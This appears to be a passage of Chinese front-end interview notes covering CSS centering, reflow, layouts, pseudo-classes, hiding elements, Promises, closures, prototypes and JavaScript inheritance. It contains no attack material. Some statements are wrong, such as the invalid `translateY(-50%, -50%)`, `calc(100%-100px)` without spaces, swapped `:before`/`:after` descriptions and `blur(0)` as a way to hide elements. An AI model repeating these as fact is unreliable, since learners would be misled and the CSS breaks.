- 未知高度的块级父子元素居中，模拟表格布局
- 缺点：IE67不兼容，父级 overflow：hidden 失效

```css
.container {
    display: table;
  }
  .content {
    display: table-cell;
    vertical-align: middle;
  }
```

* 新增 inline-block 兄弟元素，设置 vertical-align
  - 缺点：需要增加额外标签，IE67不兼容

```css
.container {
  height: 100%;/*定义父级高度，作为参考*/
}
.extra .vertical{
  display: inline-block;  /*行内块显示*/
  vertical-align: middle; /*垂直居中*/
}
.extra {
  height: 100%; /*设置新增元素高度为100%*/
}
```

- 绝对定位配合 CSS3 位移

```css
.vertical {
  position: absolute;
  top:50%;  /*父元素高度50%*/
  transform:translateY(-50%, -50%);
}
```

- CSS3弹性盒模型

```css
.container {
  display:flex;
  justify-content: center; /*子元素水平居中*/
  align-items: center; /*子元素垂直居中*/
}
```

## 34 如何使用CSS实现硬件加速？

> 硬件加速是指通过创建独立的复合图层，让GPU来渲染这个图层，从而提高性能，

- 一般触发硬件加速的`CSS`属性有`transform`、`opacity`、`filter`，为了避免2D动画在 开始和结束的时候的`repaint`操作，一般使用`tranform:translateZ(0)`

## 35 重绘和回流（重排）是什么，如何避免？

- 重绘：当渲染树中的元素外观（如：颜色）发生改变，不影响布局时，产生重绘
- 回流：当渲染树中的元素的布局（如：尺寸、位置、隐藏/状态状态）发生改变时，产生重绘回流
- **注意**：JS获取Layout属性值（如：`offsetLeft`、`scrollTop`、`getComputedStyle`等）也会引起回流。因为浏览器需要通过回流计算最新值
- 回流必将引起重绘，而重绘不一定会引起回流

**如何最小化重绘(repaint)和回流(reflow)**：

- 需要要对元素进行复杂的操作时，可以先隐藏(`display:"none"`)，操作完成后再显示
- 需要创建多个`DOM`节点时，使用`DocumentFragment`创建完后一次性的加入`document`
- 缓存`Layout`属性值，如：`var left = elem.offsetLeft;` 这样，多次使用 `left` 只产生一次回流
- 尽量避免用`table`布局（`table`元素一旦触发回流就会导致table里所有的其它元素回流）
- 避免使用`css`表达式(`expression`)，因为每次调用都会重新计算值（包括加载页面）
- 尽量使用 `css` 属性简写，如：用 `border` 代替 `border-width`, `border-style`, `border-color`
- 批量修改元素样式：`elem.className` 和 `elem.style.cssText` 代替 `elem.style.xxx`

## 36 说一说css3的animation

- css3的`animation`是css3新增的动画属性，这个css3动画的每一帧是通过`@keyframes`来声明的，`keyframes`声明了动画的名称，通过`from`、`to`或者是百分比来定义
- 每一帧动画元素的状态，通过`animation-name`来引用这个动画，同时css3动画也可以定义动画运行的时长、动画开始时间、动画播放方向、动画循环次数、动画播放的方式，
- 这些相关的动画子属性有：`animation-name`定义动画名、`animation-duration`定义动画播放的时长、`animation-delay`定义动画延迟播放的时间、`animation-direction`定义 动画的播放方向、`animation-iteration-count`定义播放次数、`animation-fill-mode`定义动画播放之后的状态、`animation-play-state`定义播放状态，如暂停运行等、`animation-timing-function`
- 定义播放的方式，如恒速播放、艰涩播放等。

## 37 左边宽度固定，右边自适应

> 左侧固定宽度，右侧自适应宽度的两列布局实现

html结构

```html
<div class="outer">
    <div class="left">固定宽度</div>
    <div class="right">自适应宽度</div>
</div>
```

> 在外层`div`（类名为`outer`）的`div`中，有两个子`div`，类名分别为`left`和`right`，其中`left`为固定宽度，而`right`为自适应宽度

**方法1：左侧div设置成浮动：float: left，右侧div宽度会自拉升适应**

```css
.outer {
    width: 100%;
    height: 500px;
    background-color: yellow;
}
.left {
    width: 200px;
    height: 200px;
    background-color: red;
    float: left;
}
.right {
    height: 200px;
    background-color: blue;
}
```

**方法2：对右侧:div进行绝对定位，然后再设置right=0，即可以实现宽度自适应**

> 绝对定位元素的第一个高级特性就是其具有自动伸缩的功能，当我们将 `width`设置为 `auto` 的时候（或者不设置，默认为 `auto` ），绝对定位元素会根据其 `left` 和 `right` 自动伸缩其大小

```css
.outer {
    width: 100%;
    height: 500px;
    background-color: yellow;
    position: relative;
}
.left {
    width: 200px;
    height: 200px;
    background-color: red;
}
.right {
    height: 200px;
    background-color: blue;
    position: absolute;
    left: 200px;
    top:0;          
    right: 0;
}
```

**方法3：将左侧`div`进行绝对定位，然后右侧`div`设置`margin-left: 200px`**

```css
.outer {
    width: 100%;
    height: 500px;
    background-color: yellow;
    position: relative;
}
.left {
    width: 200px;
    height: 200px;
    background-color: red;
    position: absolute;
}
.right {
    height: 200px;
    background-color: blue;
    margin-left: 200px;
}
```

**方法4：使用flex布局**

```css
.outer {
    width: 100%;
    height: 500px;
    background-color: yellow;
    display: flex;
    flex-direction: row;
}
.left {
    width: 200px;
    height: 200px;
    background-color: red;
}
.right {
    height: 200px;
    background-color: blue;
    flex: 1;
}
```

## 38 如何实现小于12px的字体效果

> `transform:scale()`这个属性只可以缩放可以定义宽高的元素，而行内元素是没有宽高的，我们可以加上一个`display:inline-block`;

```text
transform: scale(0.7);
```

`css`的属性，可以缩放大小

## 39 css hack原理及常用hack

- 原理：CSS hack是通过在CSS样式中加入一些特殊的符号，让不同的浏览器识别不同的符号。利用不同浏览器对CSS的支持和解析结果不一样编写针对特定浏览器样式。
- https://www.w3cschool.cn/css/css-hack.html
- 常见的hack有
  - 属性hack
  - 选择器hack
  - IE条件注释

## 40 CSS有哪些继承属性

- 关于文字排版的属性如：

  - `font`

    - `word-break` 单词换行规则
    - `letter-spacing` 字符间距
    - `text-align`
    - `text-rendering`  非标准，文字的渲染规则
    - `word-spacing` 标签单词之间的间距
    - `white-space` 对文本中空白和换行符的处理规则
    - `text-indent` 段首缩进
    - `text-transform` 转换文本，全部小写，大写开头之类
    - `text-shadow` 文字阴影效果
    - `text-overflow`多余文本的处理方式，省略符、裁剪之类
  
  - `line-height`
  
  - `color`
  
  - `visibility`
  
  - `cursor`

## 42 CSS选择符有哪些？哪些属性可以继承

- id选择器（ `## myid`）
- 类选择器（`.myclassname`）
- 标签选择器（`div`, `h1`, `p`）
- 相邻选择器（`h1 + p`）
- 子选择器（`ul > li`）
- 后代选择器（`li a`）
- 通配符选择器（ `*` ）
- 属性选择器（`input[type="text"]`）
- 伪类选择器（`a:hover, li:nth-child`）

**CSS哪些属性可以继承？哪些属性不可以继承**

- 可继承的样式： `font-size font-family color, UL LI DL DD DT`
- 不可继承的样式：`border padding margin width height`

## 43 CSS3新增伪类有那些

- `:root` 选择文档的根元素，等同于 html 元素
- `:empty` 选择没有子元素的元素
- `:target` 选取当前活动的目标元素
- `:not(selector)` 选择除 `selector` 元素意外的元素
- `:enabled` 选择可用的表单元素
- `:disabled` 选择禁用的表单元素
- `:checked` 选择被选中的表单元素
- `:after` 在元素内部最前添加内容
- `:before` 在元素内部最后添加内容
- `:nth-child(n)` 匹配父元素下指定子元素，在所有子元素中排序第n
- `:nth-last-child(n)` 匹配父元素下指定子元素，在所有子元素中排序第n，从后向前数
- `:nth-child(odd)`
- `:nth-child(even)`
- `:nth-child(3n+1)`
- `:first-child`
- `:last-child`
- `:only-child`
- `:nth-of-type(n)` 匹配父元素下指定子元素，在同类子元素中排序第n
- `:nth-last-of-type(n)` 匹配父元素下指定子元素，在同类子元素中排序第n，从后向前数
- `:nth-of-type(odd)`
- `:nth-of-type(even)`
- `:nth-of-type(3n+1)`
- `:first-of-type`
- `:last-of-type`
- `:only-of-type`
- `::selection` 选择被用户选取的元素部分
- `:first-line` 选择元素中的第一行
- `:first-letter` 选择元素中的第一个字符

## 44 用纯CSS创建一个三角形的原理是什么

```css
/* 把上、左、右三条边隐藏掉（颜色设为 transparent） */
##demo {
  width: 0;
  height: 0;
  border-width: 20px;
  border-style: solid;
  border-color: transparent transparent red transparent;
}
```

## 46 请列举几种隐藏元素的方法

- `visibility: hidden;` 这个属性只是简单的隐藏某个元素，但是元素占用的空间任然存在
- `opacity: 0;` `CSS3`属性，设置`0`可以使一个元素完全透明
- `position: absolute;` 设置一个很大的 `left` 负值定位，使元素定位在可见区域之外
- `display: none;` 元素会变得不可见，并且不会再占用文档的空间。
- `transform: scale(0);` 将一个元素设置为缩放无限小，元素将不可见，元素原来所在的位置将被保留
- `<div hidden="hidden">` HTML5属性,效果和`display:none;`相同，但这个属性用于记录一个元素的状态
- `height: 0;` 将元素高度设为 `0` ，并消除边框
- `filter: blur(0);` CSS3属性，将一个元素的模糊度设置为`0`，从而使这个元素“消失”在页面中

## 47 经常遇到的浏览器的JS兼容性有哪些？解决方法是什么

- 当前样式：`getComputedStyle(el, null) VS el.currentStyle`
- 事件对象：`e VS window.event`
- 鼠标坐标：`e.pageX, e.pageY VS window.event.x, window.event.y`
- 按键码：`e.which VS event.keyCode`
- 文本节点：`el.textContent VS el.innerText`

## 48 什么是响应式设计？响应式设计的基本原理是什么？如何兼容低版本的IE

- 响应式设计就是网站能够兼容多个终端，而不是为每个终端做一个特定的版本
- 基本原理是利用CSS3媒体查询，为不同尺寸的设备适配不同样式
- 对于低版本的IE，可采用JS获取屏幕宽度，然后通过resize方法来实现兼容：

```js
$(window).resize(function () {
  screenRespond();
});
screenRespond();
function screenRespond(){
var screenWidth = $(window).width();
if(screenWidth <= 1800){
  $("body").attr("class", "w1800");
}
if(screenWidth <= 1400){
  $("body").attr("class", "w1400");
}
if(screenWidth > 1800){
  $("body").attr("class", "");
}
}
```

## 49 什么是视差滚动效果，如何给每页做不同的动画

- 视差滚动是指多层背景以不同的速度移动，形成立体的运动效果，具有非常出色的视觉体验
- 一般把网页解剖为：背景层、内容层和悬浮层。当滚动鼠标滚轮时，各图层以不同速度移动，形成视差的
- 实现原理
  - 以 “页面滚动条” 作为 “视差动画进度条”
  - 以 “滚轮刻度” 当作 “动画帧度” 去播放动画的
  - 监听 mousewheel 事件，事件被触发即播放动画，实现“翻页”效果

## 50 a标签上四个伪类的执行顺序是怎么样的

> ```
> link > visited > hover > active
> ```

- `L-V-H-A` `love hate` 用喜欢和讨厌两个词来方便记忆

## 51 伪元素和伪类的区别和作用

- 伪元素 -- 在内容元素的前后插入额外的元素或样式，但是这些元素实际上并不在文档中生成。
- 它们只在外部显示可见，但不会在文档的源代码中找到它们，因此，称为“伪”元素。例如：

```css
p::before {content:"第一章：";}
p::after {content:"Hot!";}
p::first-line {background:red;}
p::first-letter {font-size:30px;}
```

- 伪类 -- 将特殊的效果添加到特定选择器上。它是已有元素上添加类别的，不会产生新的元素。例如：

```css
a:hover {color: ##FF00FF}
p:first-child {color: red}
```

## 52 如何修改Chrome记住密码后自动填充表单的黄色背景

- 产生原因：由于Chrome默认会给自动填充的input表单加上 `input:-webkit-autofill` 私有属性造成的
- 解决方案1：在form标签上直接关闭了表单的自动填充：`autocomplete="off"`
- 解决方案2：`input:-webkit-autofill { background-color: transparent; }`

**input [type=search] 搜索框右侧小图标如何美化？**

```css
input[type="search"]::-webkit-search-cancel-button{
  -webkit-appearance: none;
  height: 15px;
  width: 15px;
  border-radius: 8px;
  background:url("images/searchicon.png") no-repeat 0 0;
  background-size: 15px 15px;
}
```

## 53 网站图片文件，如何点击下载？而非点击预览

<a href="logo.jpg" download>下载</a> <a href="logo.jpg" download="网站LOGO" >下载</a>

```
<a href="logo.jpg" download>下载</a> 
<a href="logo.jpg" download="网站LOGO">下载</a>
```

## 54 iOS safari 如何阻止“橡皮筋效果”

```js
$(document).ready(function(){
    var stopScrolling = function(event) {
        event.preventDefault();
    }
    document.addEventListener('touchstart', stopScrolling, false);
    document.addEventListener('touchmove', stopScrolling, false);
});
```

## 55 你对 line-height 是如何理解的

- `line-height` 指一行字的高度，包含了字间距，实际上是下一行基线到上一行基线距离
- 如果一个标签没有定义 `height` 属性，那么其最终表现的高度是由 `line-height` 决定的
- 一个容器没有设置高度，那么撑开容器高度的是 `line-height` 而不是容器内的文字内容
- 把 `line-height` 值设置为 `height` 一样大小的值可以实现单行文字的垂直居中
- `line-height` 和 `height` 都能撑开一个高度，`height` 会触发 `haslayout`，而 `line-height` 不会

## 56 让页面里的字体变清晰，变细用CSS怎么做？（IOS手机浏览器字体齿轮设置）

```css
-webkit-font-smoothing: antialiased;
```

## 58 一个高度自适应的div，里面有两个div，一个高度100px，希望另一个填满剩下的高度

- 方案1：

  - `.sub { height: calc(100%-100px); }`

- 方案2：

  - ```html
    <div class="container">
        <div class="d1"></div>
        <div class="sub">必须要有内容</div>
    </div>
    ```

  - `.container { position:relative; }`

  - `.sub { position: absolute; top: 100px; bottom: 0; }`

- 方案3：

  - `.container { display:flex; flex-direction:column; }`
  - `.sub { flex:1; }`

# JS部分
## Promise
**回调地狱**:在js中我们经常会大量使用异步回调，例如使用ajax请求，面对复杂场景，太多的回调形成地狱

* Promise有三种状态：**等待态（Pending）、执行态（Fulfilled）和拒绝态（Rejected）**，且Promise必须为三种状态之一只有异步操作的结果，可以决定当前哪一种状态，任何其它操作都无法改变这个状态。
* **状态只能由 Pending 变为 Fulfilled 或由 Pending 变为 Rejected** ，且状态改变之后不会再发生变化，会一直保持这个状态
* Pending 变为 Fulfilled 会得到一个私有**value**，Pending 变为 Rejected会得到一个私有**reason**，当Promise达到了Fulfilled或Rejected时，执行的异步代码会接收到这个value或reason。

> 构造函数
```js
// 构造函数, 返回一个Promise对象
const promise = new Promise((resolve, reject) => {
    // 某些异步操作
    // 成功通过resolve(value)返回结果
    // 失败通过reject(errmsg)返回信息
})
```

> 实例方法
``` js
// 为 promise 添加被兑现和被拒绝状态的回调函数，其以回调函数的返回值兑现 promise。若不处理已兑现或者已拒绝状态（例如，onFulfilled 或 onRejected 不是一个函数），则返回 promise 被敲定时的值。
Promise.prototype.then()

// 为 promise 添加一个被拒绝状态的回调函数，并返回一个新的 promise，若回调函数被调用，则兑现其返回值，否则兑现原来的 promise 兑现的值。
Promise.prototype.catch()

// 为 promise 添加一个回调函数，并返回一个新的 promise。这个新的 promise 将在原 promise 被兑现时兑现。而传入的回调函数将在原 promise 被敲定（无论被兑现还是被拒绝）时被调用。
Promise.prototype.finally()
```

> 静态方法
``` js
// iterable一般传进去一个由多个Promise对象组成的数组
// 返回：一个新的 promise 对象，等到所有的 promise 对象都成功或有任意一个 promise 失败。
// 结果：
// 	- 成功：iterable 里所有 promise 返回值的数组作为成功回调的返回值。顺序跟 iterable 的顺序保持一致。
//  - 失败：一旦有任意一个 iterable 里面的 promise 对象失败则立即以该 promise 对象失败的理由来拒绝这个新的 promise。
Promise.all(iterable)

// 与all类似的输入
// 输出区别：当所有的 promises 都已经结束无论是完成状态或者是失败状态，它都会返回一个 promise，这个 promise 将会包含一个关于描述每个 promise 状态结果的对象数组。
// [ {status: 'xxx', value: xxx} ] 
Promise.allSettled(iterable)

// 接收一个 promise 对象的集合，当其中的任意一个 promise 成功，就返回那个成功的 promise 的值。
// 不关心是否失败，关心第一个成功的，谁成功都行
Promise.any(iterable)

// 等到任意一个 promise 的状态变为已敲定。
// 关心第一个成功或者失败的结果
Promise.race(iterable)

// 返回一个状态为已拒绝的 Promise 对象，并将给定的失败信息传递给对应的处理函数。
Promise.reject(reason)

/* 
	返回一个状态由给定 value 决定的 Promise 对象。如果该值是 thenable（即，带有 then 方法的对象），返回的Promise 对象的最终状态由 then 方法执行结果决定；否则，返回的 Promise 对象状态为已兑现，并且将该 value 传递给对应的 then 方法。
  	通常而言，如果你不知道一个值是否是 promise 对象，使用 Promise.resolve(value) 来返回一个 Promise 对象，这样就能将该 value 以 promise 对象形式使用。*/
Promise.resolve(value)



```

[allSettled与all的区别](https://cloud.tencent.com/developer/article/1730975)

## async和await

async是es7新增的关键字，用于定义异步函数。通过async定义的函数返回一个Promise对象

await是等待 async 的异步执行，而且只能在 async 里面定义。sync 函数执行时，如果**遇到 await 就会先暂停执行 ，等到触发的异步操作完成后**，恢复 async 函数的执行并返回解析值。

await 关键字仅在 async function 中有效。如果在 async function 函数体外使用 await ，你只会得到一个语法错误。

## 闭包

* 闭包就是能够读取其它函数作用域内部变量的函数
* 创建最常用的方式就是在A函数内创建另一个B函数，通过B函数访问这个函数的局部变量，利用闭包可以突破**作用域链**
  * 作用域链的作用是保证执行环境里有权访问的变量和函数是有序的，作用域链的变量只能向上访问，变量访问到`window`对象即被终止，作用域链向下访问变量是不被允许的
  * 简单的说，作用域就是变量与函数的可访问范围，即作用域控制着变量与函数的可见性和生命周期
* 特性：
  * 函数内再嵌套函数
  * 内部函数可以引用外层的参数和变量
  * 参数和变量不会被自动垃圾回收

### 理解

* 使用闭包主要是为了设计私有的方法和变量。闭包的优点是可以避免全局变量的污染，缺点是闭包会常驻内存，会增大内存使用量，使用不当很容易造成内存泄露。在js中，函数即闭包，只有函数才会产生作用域的概念
* 闭包 的用处：
  * 可以读取函数内部的变量，
  * 让这些变量始终保持在内存中
  * 封装对象的私有属性和私有方法

* **好处**：能够实现封装和缓存等
* **坏处**：消耗内存、不正当使用会造成内存溢出问题
* **注意点**：
  * 由于闭包会使得函数中的变量都被保存在内存中，内存消耗很大，所以不能滥用闭包，否则会造成网页的性能问题，在IE中可能导致内存泄露
  * 解决方法是，在退出函数之前，将不使用的局部变量全部删除

### 闭包和let块级作用域

针对题目

> 写一个隔一秒输出数组一项的函数

* 如果可以使用ES6语法，则可以这么写

```js
function print (arr) {
    for (let i = 0; i < arr.length; i++) {
        setTimeout(() => {
            console.log(arr[i])
        }, 1000 * i);
    }
}
```

但是如果把这里的`let`改成`var`，则输出就会变成一连串的`undefined`。

有同学很快想到了这是闭包啊，因为`setTimeout`把函数加入到`microqueue`中，所以等到`setTimeout`的函数体执行时，`i`已经走完了`for`循环，变成了`arr.length`。`arr[arr.length]`显然是undefined。

* 使用ES5+闭包实现相同效果

```js
function print (arr) {
    for (var i = 0; i < arr.length; i++) {
        (function (index) {
            setTimeout(() => {
                console.log(arr[index])
            }, 1000 * index);
        })(i);    
    }
}
```

## JavaScript原型，原型链 ? 有什么特点？

**自己的解读**

* 在js创立的时候，是秉持着流行的万物皆对象的思想，但只是想创建一门简单的语言，不想实现类和继承这样C++、java等语言复杂的机制，但又需要这种功能。

* 在实现的时候不像C++等语言`new 类`，然后调用”类“对应的”构造函数“，js是`new 构造函数(constructor)`。但用构造函数生成实例对象，有一个缺点，就是无法共享属性和方法。因此创建了`prototype`属性对象（显示原型）。
* 当实例创建的时候，会自动引入`prototype`对象，使得实例可以使用引用的方法，引入的方式就是实例有一个私有属性`__proto__`，即`__proto__`===`constructor.prototype`
  * 但是通过` Object.create()`创建的一个新对象，使用现有的对象（原材料）来提供新创建的对象的`__proto__`。
* `__proto__`这个私有属性是每个对象都有的，又因为它的指向，因此可以实现原型链的效果

### 原型

- `prototype（显式原型）`

  - <span style="color: red;">每一个函数（仅限函数）在创建之后都会拥有一个名为prototype的属性，这个属性指向函数的原型对象。</span>
  - 作用：用于放某同一类型实例的共享属性和方法，**不会反复开辟存储空间，减少内存浪费**，
    - 这个属性是一个指针，指向一个对象，这个对象的用途就是包含所有实例共享的属性和方法（我们把这个对象叫做原型对象）。
    - 原型对象也有一个属性，叫做constructor，这个属性包含了一个指针，指回原构造函数。
  - 原型中this指向实例化对象
  - **Note**：通过`Function.prototype.bind`方法构造出来的函数是个例外，它没有prototype属性。

- `[__proto__]（隐式原型）`:

  - `JavaScript`的所有对象中都包含了一个 `__proto__` 内部属性，所有引用类型都有，指向构造函数的显示原型

  - <img src="https://img-blog.csdnimg.cn/20190309181753763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3g1NTAzOTIyMzY=,size_16,color_FFFFFF,t_70" alt="img" style="zoom:50%;" />

  - 在ES5之前没有标准的方法访问这个内置属性，但是大多数浏览器都支持通过`__proto__`来访问。ES6中有了对于这个内置属性标准的方法:

    - ```js
      Object.setPrototypeOf()   // (写)
      Object.getPrototypeOf()   // (读)
      Object.create()           // (生成。创建) 
      ```

  - 作用：构成原型链，同样用于实现基于原型的继承。举个例子，当我们访问obj这个对象中的x属性时，如果在obj中找不到，那么就会沿着`__proto__`依次查找

  - **Note**: `Object.prototype` 这个对象是个例外，它的`__proto__`值为null

- `constructor`：

  - <span style="color: red;">所有的 prototype 和 实例化对象 都有一个constructor 属性，都指向关联的构造函数本身</span>
  - 所以**constructor属性其实就是一个拿来保存自己构造函数引用的属性**，没有其他特殊的地方。

```js
function Person() {};
var person1 = new Person();
var person2 = new Person();

console.log(person1.constructor === Person); // true
console.log(Person.constructor === Function); // true
console.log(Function.constructor === Function); // true
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/2019052116033342.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3g1NTAzOTIyMzY=,size_16,color_FFFFFF,t_70)

当我们声明一个function关键字的方法时，会为这个方法添加一个prototype属性，指向默认的原型对象，并且此prototype的constructor属性也指向方法对象。此二个属性会在创建对象时被对象的属性引用。

```js
function Hello() {}; // 构造函数
var h = new Hello();  // 实例化对象


// 所有函数都有个prototype属性（显式原型）
console.log(Hello.prototype); // Object {}  原型对象
// 构造函数的prototype属性有个constructor属性，指向构造函数本身
console.log(Hello.prototype.constructor === Hello); // true
// 实例化对象没有prototype属性、只有函数才有prototype属性
console.log(h.prototype); // undefined


// 实例化对象的constructor属性指向构造函数本身
console.log(h.constructor === Hello); // true
// 即
console.log(h.constructor === Hello.prototype.constructor); // true 


// 所有引用类型都拥有__proto__属性（隐式原型）
console.log(h.__proto__ === Hello.prototype); // true  
// 即
console.log(h.__proto__ === h.constructor.prototype); //true
// 即
console.log(Hello.prototype === h.constructor.prototype); //true
// 即
console.log(Hello === h.constructor); // true

```

- 二者的关系：隐式原型指向**创建**这个对象的constructor的显式原型

  - `obj.__proto__ === obj.constructor.prototype`
- 原型是一个对象，其他对象可以通过它实现属性继承
- JavaScript的函数对象，除了原型 `[__proto__]` 之外，还预置了 `prototype` 属性
- 当函数对象作为构造函数创建实例时，该 `prototype（显式原型）`属性值将被作为实例对象的原型 `[__proto__]`。
- 大多数情况下，`__proto__`可以理解为“构造器的原型”,但是通过 `Object.create()`创建的对象有可能不是， `Object.create()`方法创建一个新对象，使用现有的对象来提供新创建的对象的`__proto__`

### 原型链

- 当一个对象调用的属性/方法自身不存在时，就会去自己 `[__proto__]` 关联的前辈 `prototype` 对象上去找
- 如果没找到，就会去该 `prototype` 原型 `[__proto__]` 关联的前辈 `prototype` 去找。依次类推，直到找到属性/方法或 `undefined` 为止。从而形成了所谓的“原型链”

![在这里插入图片描述](https://img-blog.csdnimg.cn/94300021f9424ee185a5f70ba9f604ad.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3g1NTAzOTIyMzY=,size_16,color_FFFFFF,t_70#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/0c47393c73724a9f8774ed29820982ed.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3g1NTAzOTIyMzY=,size_16,color_FFFFFF,t_70#pic_center)

## 构造函数
通过 new 函数名 来实例化对象的函数叫 构造函数。
任何的函数都可以作为构造函数存在。之所以有构造函数与普通函数之分，主要从功能上进行区别的，构造函数的主要 功能为**初始化对象，特点是和new 一起使用**。new就是在创建对象，从无到有，构造函数就是在为初始化的对象添加属性和方法。构造函数定义时**首字母大写**（规范）。

### 1 new一个新对象的过程，发生了什么

* 创建一个空对象`obj {}`
* 空对象的`_proto_`指向了构造函数的`prototype`成员对象
* 使用`apply`调用构造器函数，属性和方法被添加到 `this `引用的对象中
* 如果构造函数中没有返回其它对象，那么返回 this，即创建的这个的新对象，否则，返回构造函数中返回的对象
* new 申请内存, 创建对象,当调用new时，后台会隐式执行`new Object()`创建对象。所以，通过new创建的字符串、数字是引用类型，而是非值类型。

### 2 构造函数上的方法

* 在构造函数上直接定义方法（不共享，不推荐）

```js
function Person() {
    this.say = function () { // 直接定义方法
        console.log('hello');
    }
}

let p1 = new Person();
let p2 = new Person();
p1.say(); // hello
p2.say(); // hello

console.log(p1.say === p2.say); // false
```

很明显，p1 和 p2 指向的不是一个地方。 所以 在构造函数上通过 this 来添加方法的方式来生成实例，**每次生成实例，都是`新开辟一个内存空间`存方法**。这样会导致内存的极大浪费，从而`影响性能`。

* 通过原型添加方法（共享）

```js
function Person(name) {
    this.name = name;
}
Person.prototype.say = function () { // 通过原型添加方法
    console.log('hello ' + this.name);
}

let p1 = new Person('张三');
let p2 = new Person('李四');
p1.say(); // hello 张三
p2.say(); // hello 李四

console.log(p1.say === p2.say); // true
```

**`将私有属性定义到构造函数里，将公共方法放到原型对象上`**

## Javascript如何实现继承？

```js
// 已有父类
function Person(name) {
    this.name = name;
    this.showName = function () {
        return this.name;
    }
}
// 原型对象上添加属性
Person.prototype.age = 18;
Person.prototype.friends = ['小明', '小强'];
```

### 1 构造函数继承（call和apply）

利用`call apply`改变`this`指向

```js
// 用法1 内部让父构造调用call，可以传参
function Student(name) {
    Person.call(this, name);
    // Person.apply(this, [name]);  apply的参数传递必须放在一个数组中
}

// 用法2 父类实例使用call改变this
function Student(name) {
    this.name = name;
}
var s1 = new Person('张三');
var s2 = new Student('李四');
console.log( s1.showName.call(s2) ); // 李四
// console.log(s1.showName.apply(s2));
```

* 优点：

  * 创建子类实例时可以向父类传参
  * 可以实现多重继承，即子类中有多个父类调用call

* 缺点：

  * 实例并不是父类实例，只有子类的实例

  * 只能继承父类的实例属性和方法，不能继承其原型属性/方法

  * 无法实现函数复用，每个子类都有父类实例函数的副本，影响性能

  * ```js
    function Student(name) {
        Person.call(this, name);
        // Person.apply(this, [name]);
    }
    
    let s1 = new Student('小红')
    console.log(s1.name); // 小红
    
    // 无法继承原型上的属性和方法
    console.log(s1.age); // undefined
    console.log(s1.friends); // undefined
    ```

### 2 原型链继承

```js
function Student(name) {
    this.name = name;
}
Student.prototype = new Person(); 
// prototype指向实例对象，可以继承Person的构造函数属性和原型对象上的属性
// Student.prototype = Person.prototype; 
// 不能继承Person的构造函数属性，只能继承Person原型对象上的属性，还会修改子会影响父
Student.prototype.constructor = Student;

let s1 = new Student('刘一');
console.log(s1.name); // 刘一
console.log(s1.showName()); // 刘一
console.log(s1.age); // 18
console.log(s1.friends); // ["小明", "小强"]

// 父子构造函数的原型对象之间有共享问题（修改子会影响父）
s1.friends.push('小红');
console.log(s1.friends); // ["小明", "小强", "小红"]

let s2 = new Student();
console.log(s2.friends); // ["小明", "小强", "小红"]
```

* 优点：
  * Student 实例可继承父类构造函数（Person）的属性方法和父类原型对象（Person.prototype）上的属性方法
  * 简单，易于实现
* 缺点：
  * Student 实例无法向父类构造函数（Person）传参（组合方式继承中解决）
  * 继承单一，无法实现多继承（组合方式继承中解决）
* 来自原型对象的所有属性被所有实例共享。（原型上的属性是共享的，一个实例修改了原型属性，另一个实例的原型属性也会被修改！因为是通过prototype实现的，显然）

### 3 组合继承

组合式继承是比较常用的一种继承方法，其背后的思路是：

* 通过使用原型链实现对原型属性和方法的继承（`Child.prototype = new Parent()`）
* 通过借用构造函数来实现对实例属性的继承（`Parent.call(this,hello)`）

**优点**：

* 可以继承父类原型上的属性，可以传参，可复用
* 每个新实例引入的构造函数属性是私有的

**缺点**：

* 调用了两次父类构造函数 Person（耗内存），子类的构造函数会代替原型上的那个父类构造函数。
* 父子构造函数的原型对象之间有共享问题（问题依旧）

```js
function Worker(name) {
    Person.call(this, name); // 构造函数继承
}

Worker.prototype = new Person(); // 原型链继承
Worker.prototype.constructor = Worker;

let w1 = new Worker('张三');
console.log(w1.name); // 张三
console.log(w1.showName()); // 张三
console.log(w1.age); // 18
console.log(w1.friends); // ["小明", "小强"]

//一个实例修改了原型属性，另一个实例的原型属性也会被修改 
w1.friends.push('李四')
let p1 = new Person()
console.log(p1.friends); // ["小明", "小强", "李四"]
```

### 4 原型式继承

```js
function content(obj) { // 先封装一个函数容器，用来输出对象和承载继承的原型
    function Fn() {}
    Fn.prototype = obj; // 修改类的原型为obj, 于是Fn的实例都将继承obj上的方法
    return new Fn();
}

let p1 = content(new Person('李四'));
//上面在ECMAScript5 有了一新的规范写法，Object.create() 效果是一样的  
// let p1 = Object.create(new Person('李四'));

console.log(p1.name); // 李四
console.log(p1.showName()); // 李四
console.log(p1.age); // 18
console.log(p1.friends); // ["小明", "小强"]
```

**优点：**

* 类似于复制一个对象，用函数来包装。

**缺点：**

* 所有实例都会继承原型上的属性。

* 无法实现复用。（新实例属性都是后面添加的）



### 5 寄生式继承

```js
function content(obj) {
    function Fn() {}
    Fn.prototype = obj; // 继承了传入的参数
    return new Fn();
}

// 在原型式继承外面 '又' 套了个壳子
function subObj(obj) {
    let sub = content(obj);
    sub.name = "王五";
    return sub;
}

let p1 = subObj(new Person());
console.log(p1.name); // 王五
console.log(p1.showName()); // 王五
console.log(p1.age); // 18
console.log(p1.friends); // // ["小明", "小强"]
```

**优点：**

* 没有创建自定义类型，因为只是套了个壳子返回对象（这个），这个函数顺理成章就成了创建的新对象。

**缺点：**

* 没用到原型，无法复用。

### 6 寄生组合式继承（ 常用）

```js
function Student(name) {
    Person.call(this, name);
}

// 创建一个没有实例方法的类
let Super = function () {};
Super.prototype = Person.prototype;
//将实例作为子类的原型
Student.prototype = new Super();

let s1 = new Student('赵六');
console.log(s1.name); // 赵六
console.log(s1.showName()); // 赵六
console.log(s1.age); // 18
console.log(s1.friends); // // ["小明", "小强"]
```

## 什么是事件代理

- 事件代理（`Event Delegation`），又称之为事件委托。是 `JavaScript` 中常用绑定事件的常用技巧。顾名思义，“事件代理”即是把原本需要绑定的事件委托给父元素，让父元素担当事件监听的职务。事件代理的原理是DOM元素的事件冒泡。使用事件代理的好处是可以提高性能
- 原理：事件冒泡
- <img src="https://img-blog.csdnimg.cn/2019011111581623.jpg" alt="img" style="zoom:150%;" />
